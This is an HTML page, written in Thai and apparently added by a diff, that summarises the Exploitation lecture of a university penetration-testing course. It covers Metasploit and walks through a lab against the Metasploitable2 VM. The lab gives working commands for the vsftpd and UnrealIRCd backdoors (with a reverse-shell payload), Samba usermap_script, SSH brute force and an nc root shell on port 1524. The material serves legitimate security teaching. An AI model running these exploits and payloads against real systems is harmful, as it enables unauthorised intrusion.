@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lecture 6 - Exploitation</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <nav class="navbar">
+    <div class="nav-inner">
+      <span class="brand">PenTest สรุป</span>
+      <a href="L1.html">L1</a>
+      <a href="L2.html">L2</a>
+      <a href="L3.html">L3</a>
+      <a href="L4.html">L4</a>
+      <a href="L5.html">L5</a>
+      <a href="L6.html" class="active">L6</a>
+      <a href="L7.html">L7</a>
+    </div>
+  </nav>
+
+  <main class="a4">
+
+    <h1>สรุปเนื้อหาและปฏิบัติการ Lecture 6: Exploitation</h1>
+    <p class="subtitle">วิชา Penetration Testing and Protection (0406136051)</p>
+
+    <h2>1. สรุปเนื้อหาสำคัญ (Theoretical Overview)</h2>
+    <ul>
+      <li><strong>Exploitation Phase:</strong> ขั้นตอนการจำลองการโจมตีเพื่อใช้ประโยชน์จากช่องโหว่ความปลอดภัยที่ตรวจพบ (Bypass security flaw) มุ่งเน้นการยืนยันว่าช่องโหว่นั้นสามารถถูกเจาะได้จริง (Vulnerability Validation &amp; PoC Execution) และประเมินระดับความเสียหายที่อาจเกิดขึ้น</li>
+      <li><strong>Exploit คืออะไร:</strong> วิธีการเลี่ยงช่องโหว่หรือหลบหลีกการควบคุมความปลอดภัย (Circumvent security control) รูปแบบการโจมตีแตกต่างกันตามระบบปฏิบัติการ บริการ และกระบวนการของเป้าหมาย แต่เป้าหมายสุดท้ายคือการเข้าถึงระบบโดยไม่ได้รับอนุญาต ควบคุม หรือดึงข้อมูล</li>
+      <li><strong>เป้าหมายหลักของการทำ Exploitation (Goals):</strong>
+        <ul>
+          <li><strong>Validate Vulnerabilities:</strong> ยืนยันว่าช่องโหว่ที่พบสามารถถูกโจมตีได้จริง</li>
+          <li><strong>Assess Impact:</strong> ประเมินความเสียหายที่อาจเกิดขึ้น</li>
+          <li><strong>Gain Access:</strong> เข้าถึงระบบ ข้อมูล หรือเครือข่ายโดยไม่ได้รับอนุญาต</li>
+          <li><strong>Elevate Privileges:</strong> ยกระดับสิทธิ์เป็นระดับสูงสุด (เช่น root หรือ SYSTEM)</li>
+          <li><strong>Establish Persistence:</strong> ตั้งกลไกคงการเข้าถึงไว้ในระยะยาว</li>
+        </ul>
+      </li>
+      <li><strong>กิจกรรมหลัก (Key Activities):</strong> Proof of Concept (PoC), Exploit Development, Gaining Access, Lateral Movement และ Privilege Escalation</li>
+    </ul>
+
+    <h2>2. ขั้นตอนในเฟส Exploitation (Steps)</h2>
+    <ul>
+      <li><strong>1. Preparation and Planning:</strong> เลือกช่องโหว่ที่มีแนวโน้มถูกโจมตีได้ดีที่สุด (พิจารณาความรุนแรง ผลกระทบ และความสามารถในการโจมตี) แล้วเตรียมหรือปรับแต่ง Exploit</li>
+      <li><strong>2. Exploit Execution:</strong> ใช้เครื่องมือ สคริปต์ หรือเทคนิคด้วยมือโจมตีช่องโหว่ เพื่อให้ได้การเข้าถึงครั้งแรก (Initial Foothold) เช่น User Account, Shell Access หรือควบคุม Web Application</li>
+      <li><strong>3. Post-Exploitation:</strong> ยกระดับสิทธิ์ (Privilege Escalation), สำรวจระบบ (System Enumeration), ขโมยข้อมูล (Data Exfiltration) และติดตั้ง Persistence (Backdoor / สร้างบัญชีผู้ใช้ใหม่ / แก้ไขการตั้งค่าระบบ)</li>
+      <li><strong>4. Cleanup and Documentation:</strong> ลบ Artifacts ที่ใช้ระหว่างการโจมตีเพื่อเลี่ยงการตรวจจับ และบันทึกสิ่งที่ค้นพบสำหรับรายงาน</li>
+    </ul>
+
+    <h2>3. Metasploit Framework</h2>
+    <ul>
+      <li><strong>คืออะไร:</strong> ทั้งระบบทดสอบเจาะระบบและแพลตฟอร์มพัฒนาเครื่องมือความปลอดภัย ประกอบด้วย Tools, Libraries, Modules และ User Interfaces ทำงานเป็น Module Launcher — ตั้งค่า Exploit Module แล้วยิงไปยังเป้าหมาย หากสำเร็จ Payload จะทำงานบนเครื่องเป้าหมายและให้ Shell เพื่อโต้ตอบ</li>
+      <li><strong>Metasploit vs Vulnerability Scanner:</strong> Scanner เพียงตรวจสอบว่าระบบมีช่องโหว่หรือไม่ (Passive, เสี่ยงสร้างความเสียหายน้อย) ส่วน Metasploit เป็นเครื่องมือ Exploitation ที่ใช้เจาะเป้าหมายจริง</li>
+      <li><strong>คุณสมบัติเด่น:</strong> Modular Architecture, ฐานข้อมูล Exploit จำนวนมากที่อัปเดตโดยชุมชน, Automated Exploitation, Payload Customization, Post-Exploitation Tools และ UI หลายรูปแบบ (msfconsole / Armitage)</li>
+      <li><strong>สถาปัตยกรรม (เขียนด้วย Ruby):</strong>
+        <ul>
+          <li><strong>Rex (Ruby Extension Library):</strong> จัดการ Network Protocols พื้นฐาน (TCP, UDP, SSL, HTTP, SMB), Socket, Text Formatting และ Data Structures</li>
+          <li><strong>MSF Core:</strong> ฟังก์ชันพื้นฐานของเฟรมเวิร์ก — Event Management, Session Control, UI และ Module Management</li>
+          <li><strong>MSF Base:</strong> ขยาย MSF Core ด้วย API แบบง่ายสำหรับ UI (msfconsole) และ Scripts</li>
+        </ul>
+      </li>
+    </ul>
+
+    <h2>4. โมดูลสำคัญของ Metasploit (Modules)</h2>
+    <table>
+      <tr><th>โมดูล</th><th>รายละเอียด</th></tr>
+      <tr><td><strong>Exploits</strong></td><td>โค้ดหรือสคริปต์ที่ใช้โจมตีจุดอ่อนของโปรแกรมเป้าหมาย (เช่น Buffer Overflow, RCE) เพื่อส่ง Payload</td></tr>
+      <tr><td><strong>Payloads</strong></td><td>โค้ดที่ถูกส่งไปทำงานบนเครื่องเหยื่อหลังเจาะสำเร็จ เช่น Reverse Shell, Bind Shell, Meterpreter</td></tr>
+      <tr><td><strong>Encoders</strong></td><td>เข้ารหัส/Obfuscate Payload เพื่อหลบหลีกการตรวจจับของ Antivirus, Firewall, IDS/IPS และ EDR</td></tr>
+      <tr><td><strong>Auxiliary</strong></td><td>โมดูลสำหรับสแกน, Fuzzing, หรือ Brute-Force ตรวจสอบข้อมูลโดยไม่ส่ง Payload</td></tr>
+      <tr><td><strong>NOP</strong></td><td>คำสั่งภาษาแอสเซมบลีที่ "ไม่ทำอะไร" ใช้เติมพื้นที่ Shellcode ให้สอดคล้องกัน</td></tr>
+      <tr><td><strong>Post-Exploitation</strong></td><td>เครื่องมือสำหรับทำงานหลังเจาะสำเร็จ เช่น Privilege Escalation และ Data Extraction</td></tr>
+      <tr><td><strong>Evasion</strong></td><td>โมดูลสร้าง Payload ที่เลี่ยงการตรวจจับของ EDR / Antivirus</td></tr>
+    </table>
+
+    <h2>5. คำสั่งพื้นฐานของ Metasploit (Commands)</h2>
+    <ul>
+      <li><code>msfconsole</code> — เริ่ม Metasploit ผ่าน Command Line</li>
+      <li><code>search &lt;keyword&gt;</code> — ค้นหาโมดูล กรองได้ด้วย type:, cve:, platform:, rank: เช่น <code>search type:exploit name:vsftpd</code> หรือ <code>search cve:2011-2523</code></li>
+      <li><code>use &lt;module_path/number&gt;</code> — เลือกโมดูล เช่น <code>use exploit/unix/ftp/vsftpd_234_backdoor</code> &nbsp; <code>back</code> — ยกเลิกโมดูลปัจจุบัน</li>
+      <li><code>info</code> — แสดงรายละเอียดโมดูล (Options, References CVE/BID, ผู้พัฒนา)</li>
+      <li><code>show options</code> — แสดงตัวเลือกที่ต้องตั้งค่า &nbsp; <code>show payloads</code> — แสดง Payload ที่ใช้ได้กับ Exploit นี้</li>
+      <li><code>set &lt;OPTION&gt; &lt;VALUE&gt;</code> — ตั้งค่าตัวเลือก เช่น <code>set RHOSTS &lt;Target_IP&gt;</code>, <code>set PAYLOAD cmd/unix/reverse</code></li>
+      <li><code>exploit</code> หรือ <code>run</code> — เริ่มการโจมตี &nbsp; <code>sessions -i 1</code> — เข้าโต้ตอบกับ Session ที่ได้</li>
+    </ul>
+
+    <h3>ตัวเลือกสำคัญของ Exploit Module</h3>
+    <ul>
+      <li><strong>RHOST / RPORT:</strong> ที่อยู่เป้าหมายและพอร์ตที่โจมตี</li>
+      <li><strong>LHOST / LPORT:</strong> IP ของ Kali และพอร์ตที่ใช้รับ Reverse Connection</li>
+      <li><strong>Connection Type:</strong> <strong>Bind</strong> (ยิง Exploit แล้วเชื่อมต่อไปยังเป้าหมาย — เหมาะเมื่อเป้าหมายอยู่หลัง NAT/Firewall), <strong>Reverse</strong> (บังคับให้เป้าหมายเชื่อมกลับมาหาเรา), <strong>Auto</strong> (เลือกอัตโนมัติ)</li>
+    </ul>
+
+    <h2>6. ขั้นตอนการใช้งาน Metasploit กับเครื่องเป้าหมาย</h2>
+    <ol>
+      <li>เปิด Terminal แล้วรัน <code>msfconsole</code></li>
+      <li>ใช้ <code>search</code> หา Exploit ที่ตรงกับช่องโหว่จากรายงานการสแกน (เช่น CVE)</li>
+      <li>ใช้ <code>use</code> เลือก Exploit</li>
+      <li>ใช้ <code>show payloads</code> ดู Payload ที่เลือกได้</li>
+      <li>ใช้ <code>set payload &lt;path&gt;</code> เลือก Payload</li>
+      <li>ใช้ <code>show options</code> ดูตัวเลือกที่ต้องกรอก</li>
+      <li>ใช้ <code>set</code> กรอกค่าตัวเลือก (RHOSTS, LHOST, LPORT ฯลฯ)</li>
+      <li>ใช้ <code>exploit</code> หรือ <code>run</code> ยิง Exploit ไปยังเป้าหมาย</li>
+    </ol>
+
+    <h2>7. รายละเอียดขั้นตอนปฏิบัติการ Lab (Step-by-Step Practical Guide)</h2>
+
+    <h3>ตอนที่ 1: การเจาะระบบผ่านบริการ FTP และ Backdoors</h3>
+    <ul>
+      <li><strong>โจมตี vsftpd 2.3.4 Backdoor (Port 21):</strong> รันคำสั่งใน <code>msfconsole</code> โดยเลือกใช้ <code>use exploit/unix/ftp/vsftpd_234_backdoor</code> ตั้งค่า <code>set RHOSTS &lt;Target_IP&gt;</code> แล้วสั่ง <code>exploit</code> เพื่อรับสิทธิ์ root จากนั้นลองใช้คำสั่ง <code>id</code>, <code>uname -a</code>, <code>whoami</code> เพื่อยืนยันสิทธิ์</li>
+      <li><strong>โจมตีผ่าน Python Exploit Script ด้วย Searchsploit:</strong> ค้นหา Exploit ด้วย <code>searchsploit vsftpd 2.3.4</code> ดึงสคริปต์ด้วย <code>searchsploit -m 49757</code> (option <code>-m</code> = mirror ไปยังไดเรกทอรีปัจจุบัน) แล้วรันคำสั่ง <code>python2 49757.py &lt;Target_IP&gt;</code></li>
+    </ul>
+
+    <h3>ตอนที่ 2: การเจาะระบบผ่านบริการ Network Services อื่นๆ</h3>
+    <ul>
+      <li><strong>SSH Login Brute-force (Port 22):</strong> ใช้โมดูล <code>auxiliary/scanner/ssh/ssh_login</code> โดยเตรียมไฟล์ username/password ด้วย <code>nano meta.txt</code> (ใส่ msfadmin/msfadmin ไว้ด้วย) ตั้งค่า <code>set USERPASS_FILE /home/kali/meta.txt</code>, <code>set STOP_ON_SUCCESS true</code> แล้วรัน และเข้าสู่ระบบด้วย <code>sessions -i 1</code></li>
+      <li><strong>Telnet (Port 23):</strong> สแกนหาบริการด้วย Nmap แล้วลองล็อกอิน <code>telnet &lt;Target_IP&gt; -l msfadmin</code> ระบุ password msfadmin จากนั้นลองคำสั่ง <code>id</code>, <code>uname -a</code>, <code>whoami</code></li>
+      <li><strong>SMTP Enumeration (Port 25):</strong> ใช้โมดูล <code>auxiliary/scanner/smtp/smtp_enum</code> ตั้งค่า <code>RHOSTS</code> และ <code>THREADS</code> เพื่อแจกแจงผู้ใช้ แล้วยืนยันด้วยคำสั่ง Netcat เช่น <code>VRFY mail</code>, <code>VRFY sshd</code></li>
+      <li><strong>UnrealIRCd Backdoor (Port 6667):</strong> ใช้โมดูล <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code> กำหนด Payload เป็น <code>set PAYLOAD cmd/unix/reverse</code> พร้อมตั้งค่า <code>LHOST</code> (IP ของ Kali) และ <code>LPORT</code> (เช่น 4444) แล้วสั่ง <code>exploit</code> — เป้าหมายจะเชื่อมกลับมาที่ Kali</li>
+      <li><strong>VNC Password (Port 5900):</strong> ใช้โมดูลค้นหาด้วย <code>search vnc login</code> ตั้งค่า <code>RHOSTS</code> แล้ว <code>exploit</code> เพื่อทดสอบรหัสผ่านเริ่มต้น</li>
+      <li><strong>Samba Usermap Script (Port 139 / 445):</strong> ใช้โมดูล <code>exploit/multi/samba/usermap_script</code> ตั้งค่า <code>set RHOSTS &lt;Target_IP&gt;</code> แล้วสั่ง <code>exploit</code> ตรวจสอบช่องโหว่ Samba ก่อนด้วย <code>sudo nmap -sV --script vulners -p 139,445 &lt;Target_IP&gt;</code></li>
+      <li><strong>เชื่อมต่อ Ingreslock Root Shell โดยตรง (Port 1524):</strong> รันคำสั่ง <code>nc -nv &lt;Target_IP&gt; 1524</code> เพื่อรับ Root Prompt ทันที</li>
+      <li><strong>DISTCC Command Execution (Port 3632):</strong> ตรวจสอบว่าบริการ postgresql ทำงานอยู่ (<code>service postgresql status</code> / <code>service postgresql start</code>) แล้วใช้ Exploit เพื่อรับ Shell และลองคำสั่ง <code>hostname</code>, <code>whoami</code>, <code>ifconfig</code></li>
+      <li><strong>PostgreSQL (Port 5432):</strong> ใช้โมดูล <code>auxiliary/scanner/postgres/postgres_login</code> ตั้งค่า <code>set RHOSTS &lt;Target_IP&gt;</code>, <code>set STOP_ON_SUCCESS true</code> แล้วรัน</li>
+      <li><strong>NFS (Port 2049):</strong> ตรวจสอบ RPC ด้วย <code>rpcinfo -p &lt;Target_IP&gt;</code> และดูไดเรกทอรีที่แชร์ด้วย <code>showmount -e &lt;Target_IP&gt;</code></li>
+    </ul>
+
+    <h3>ตอนที่ 3: การใช้งาน smbclient จัดการไฟล์ข้ามระบบ</h3>
+    <ul>
+      <li><strong>เชื่อมต่อไปยังไดเรกทอรีแชร์ /tmp:</strong> รันคำสั่ง <code>smbclient //&lt;Target_IP&gt;/tmp</code> (กด Enter เพื่อล็อกอินแบบ Anonymous)</li>
+      <li><strong>สั่งสร้างและตรวจสอบไดเรกทอรี:</strong> พิมพ์คำสั่ง <code>mkdir &lt;student_name&gt;</code> และตรวจสอบด้วย <code>ls</code></li>
+    </ul>
+
+    <h3>ตอนที่ 4: การใช้ Armitage (Metasploit GUI)</h3>
+    <ul>
+      <li><strong>ติดตั้งและเตรียมระบบ:</strong> รันคำสั่ง <code>sudo apt install armitage -y</code>, <code>sudo systemctl start postgresql</code> และ <code>sudo msfdb init</code></li>
+      <li><strong>เริ่มใช้งาน:</strong> เปิด Armitage จากนั้นไปที่เมนู <strong>Hosts</strong> &rarr; <strong>Nmap Scan</strong> &rarr; <strong>Quick Scan (OS Detect)</strong> และใส่ IP Address ของเครื่อง Metasploitable2 ในช่อง Targets</li>
+      <li><strong>จัดการและควบคุม Metasploit ผ่าน GUI:</strong> Armitage เป็นโปรแกรมส่วนต่อประสานกราฟิก (GUI) สำหรับจัดการและควบคุม Metasploit Framework ซึ่งช่วยให้มองเห็น Hosts, ใช้ Exploit และจัดการ Sessions ได้ง่ายขึ้น</li>
+    </ul>
+
+    <hr>
+
+    <h2>8. สรุปรายการภาระงานที่ต้องส่ง (Assignment Checklist หน้า 96)</h2>
+    <ul>
+      <li><strong>ภาพฝั่ง Kali Linux:</strong> ภาพหน้าจอ Terminal ที่ใช้คำสั่งสั่งสร้าง Directory ชื่อนักศึกษาในไดเรกทอรี <code>/tmp</code> (ผ่าน <code>smbclient</code> หรือช่องทาง Shell) พร้อมแสดงผลด้วยคำสั่ง <code>ls</code></li>
+      <li><strong>ภาพฝั่ง Metasploitable2:</strong> ภาพหน้าจอของเครื่อง Metasploitable2 เมื่อเข้าไปที่ <code>/tmp</code> แล้วรันคำสั่ง <code>ls -l</code> เพื่อยืนยันว่ามี Directory ชื่อนักศึกษาปรากฏอยู่จริง</li>
+    </ul>
+
+  </main>
+
+  <div class="footer">สรุปเนื้อหา Lecture 6 &mdash; Penetration Testing and Protection &copy; 2026</div>
+
+</body>
+</html>
